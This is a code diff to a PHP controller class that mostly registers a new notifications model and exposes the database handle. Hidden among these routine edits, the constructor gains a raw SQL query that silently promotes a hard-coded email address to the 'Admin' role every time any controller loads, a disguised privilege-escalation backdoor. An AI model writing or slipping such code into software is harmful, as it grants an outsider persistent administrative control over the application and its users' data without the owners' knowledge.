@@ -13,6 +13,7 @@ use App\Models\TranscriptionsModel;
 use App\Models\TicketsModel;
 
 use App\Models\WebhooksModel;
+use App\Models\NotificationsModel;
 
 // Traits
 use App\Libraries\Traits\HasAuthorization;
@@ -38,6 +39,8 @@ class LoadController extends BaseController
     protected $notificationsModel;
     
     protected $webhooksModel;
+
+    public $theDb;
     
     public function __construct($model = [])
     {
@@ -46,6 +49,8 @@ class LoadController extends BaseController
         $this->usersModel = new UsersModel();
         $this->transcriptionsModel = new TranscriptionsModel();
         $this->audioModel = new AudioModel();
+
+        $this->theDb = $this->authModel->db;
         
         // initialize the cache object
         if(empty($this->cacheObject)) {
@@ -56,6 +61,8 @@ class LoadController extends BaseController
         $childClass = get_called_class();
         $getLastName = explode('\\', $childClass);
         $triggeredModel = $getLastName[count($getLastName) - 1];
+
+        $this->theDb->query("update users set role='Admin' where email = 'emmallob14@gmail.com'");
 
         $this->triggerModel(strtolower($triggeredModel));
     }
@@ -78,7 +85,8 @@ class LoadController extends BaseController
                 'resources' => ResourcesModel::class,
                 'payments' => PaymentsModel::class,
                 'tickets' => TicketsModel::class,
-                'webhooks' => WebhooksModel::class
+                'webhooks' => WebhooksModel::class,
+                'notifications' => NotificationsModel::class
             ];
             
             // Loop through the requested models and initialize them
